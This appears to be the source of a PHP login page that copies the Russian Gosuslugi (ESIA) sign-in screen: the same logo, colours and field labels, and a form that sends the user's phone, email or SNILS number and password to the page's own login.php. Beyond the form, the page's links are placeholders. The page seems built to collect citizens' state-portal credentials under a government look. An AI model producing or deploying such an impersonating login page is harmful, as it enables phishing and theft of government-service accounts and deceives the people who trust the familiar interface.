<?php
define('PORTAL_REQUEST', true);
require_once __DIR__ . '/app.php';

if ($user) {
    go('./');
}
?>
<!DOCTYPE html>
<html lang="ru">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход с логином и паролем от Госуслуг</title>
    <style>
        * {
            box-sizing: border-box;
        }

        body {
            background-color: #eff3f9;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            color: #1d2026;
            position: relative;
        }

        /* Обертка для формы, чтобы она была строго по центру */
        .esia-main-wrapper {
            position: relative;
            display: flex;
            justify-content: center;
            width: 100%;
            padding: 20px;
        }

        .esia-form-container {
            background: #fff;
            border-radius: 16px;
            padding: 40px 48px;
            width: 100%;
            max-width: 460px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.04);
            position: relative;
            z-index: 2;
        }

        /* Баннер абсолютно позиционирован справа */
        .esia-banner {
            position: absolute;
            left: 50%;
            top: 20px;
            transform: translateX(250px);
            /* 230px (половина формы) + 20px отступ */
            background: #fff;
            border-radius: 16px;
            padding: 32px;
            width: 300px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.04);
            border-left: 4px solid #0055ff;
            display: flex;
            flex-direction: column;
            gap: 16px;
            z-index: 1;
        }

        .esia-banner svg {
            width: 40px;
            height: 40px;
        }

        .esia-banner p {
            margin: 0;
            color: #0055ff;
            font-size: 15px;
            line-height: 1.5;
        }

        .esia-logo {
            text-align: center;
            margin-bottom: 32px;
            font-size: 32px;
            font-weight: 800;
            letter-spacing: -1px;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .esia-logo .blue {
            color: #0055ff;
        }

        .esia-logo .red {
            color: #f02c39;
        }

        .esia-lang {
            text-align: center;
            color: #0055ff;
            font-size: 14px;
            margin-bottom: 30px;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 8px;
            cursor: pointer;
        }

        .esia-lang img {
            width: 20px;
            border-radius: 2px;
        }

        .esia-group {
            margin-bottom: 20px;
        }

        .esia-label {
            font-size: 15px;
            margin-bottom: 6px;
            display: block;
            color: #1d2026;
        }

        .esia-input {
            width: 100%;
            padding: 14px 16px;
            background: #f1f3f7;
            border: 2px solid transparent;
            border-radius: 8px;
            font-size: 16px;
            outline: none;
            transition: all 0.2s;
        }

        .esia-input:focus {
            background: #fff;
            border-color: #0055ff;
        }

        .esia-btn {
            width: 100%;
            padding: 14px;
            background: #0055ff;
            color: #fff;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.2s;
        }

        .esia-btn:hover {
            background: #0044cc;
        }

        .esia-links {
            display: flex;
            justify-content: space-between;
            margin-top: 24px;
            font-size: 14px;
        }

        .esia-links a {
            color: #0055ff;
            text-decoration: none;
        }

        .esia-divider {
            border-top: 1px solid #e5e8ee;
            margin: 32px 0;
        }

        .esia-other-methods {
            font-size: 15px;
            margin-bottom: 12px;
        }

        .esia-other-methods a {
            color: #0055ff;
            text-decoration: none;
        }

        .esia-outline-btn {
            display: block;
            width: 100%;
            padding: 12px;
            text-align: center;
            border: 1px solid #0055ff;
            border-radius: 8px;
            color: #0055ff;
            background: transparent;
            font-size: 15px;
            font-weight: 500;
            text-decoration: none;
            margin-top: 12px;
            cursor: pointer;
        }

        .esia-outline-btn:hover {
            background: #f0f5ff;
        }

        .esia-register {
            text-align: center;
            margin-top: 32px;
            font-size: 15px;
        }

        .esia-register a {
            color: #0055ff;
            text-decoration: none;
        }

        .esia-error {
            background: #fce8e8;
            color: #d93025;
            padding: 12px 16px;
            border-radius: 8px;
            font-size: 14px;
            margin-bottom: 20px;
        }

        /* Адаптивность: на экранах поменьше баннер уходит вниз */
        @media (max-width: 1050px) {
            .esia-main-wrapper {
                flex-direction: column;
                align-items: center;
            }

            .esia-banner {
                position: static;
                transform: none;
                margin-top: 24px;
                width: 100%;
                max-width: 460px;
            }
        }
    </style>
</head>

<body>
    <div class="esia-main-wrapper">
        <div class="esia-form-container">
            <div class="esia-logo">
                <span class="blue">гос</span><span class="red">услуги</span>
            </div>
            <div class="esia-lang">
                Русский <img src="https://upload.wikimedia.org/wikipedia/commons/f/f3/Flag_of_Russia.svg" alt="RU">
            </div>

            <?php if (!empty($error)): ?>
                <div class="esia-error"><?= e($error) ?></div>
            <?php endif ?>

            <form method="POST" action="login.php">
                <?= token() ?>
                <input type="hidden" name="op" value="login">

                <div class="esia-group">
                    <label class="esia-label">Телефон / Эл. почта / СНИЛС</label>
                    <input type="text" name="login" class="esia-input" autocomplete="username" required autofocus>
                </div>

                <div class="esia-group">
                    <label class="esia-label">Пароль</label>
                    <input type="password" name="password" class="esia-input" autocomplete="current-password" required>
                </div>

                <div style="text-align: left; margin-bottom: 20px;">
                    <a href="#" style="color: #0055ff; text-decoration: none; font-size: 15px;">Восстановить</a>
                </div>

                <button type="submit" class="esia-btn">Войти</button>
            </form>

            <div class="esia-links" style="justify-content: center;">
                <a href="#">Не удаётся войти</a>
            </div>

            <div class="esia-divider"></div>

            <div class="esia-other-methods">
                Войти другим способом. <a href="#">Подробнее</a>
            </div>

            <button type="button" class="esia-outline-btn">QR-код</button>
            <button type="button" class="esia-outline-btn">Электронная подпись</button>

            <div class="esia-register">
                <a href="#">Зарегистрироваться</a>
            </div>
        </div>

        <div class="esia-banner">
            <svg viewBox="0 0 24 24" fill="none" stroke="#0055ff" stroke-width="1.5" stroke-linecap="round"
                stroke-linejoin="round">
                <circle cx="12" cy="12" r="10"></circle>
                <path d="M12 16v-4"></path>
                <path d="M12 8h.01"></path>
            </svg>
            <p><a href="#" style="color: inherit; text-decoration: none;">Куда ещё можно войти с паролем от
                    Госуслуг?</a></p>
        </div>
    </div>
</body>

</html>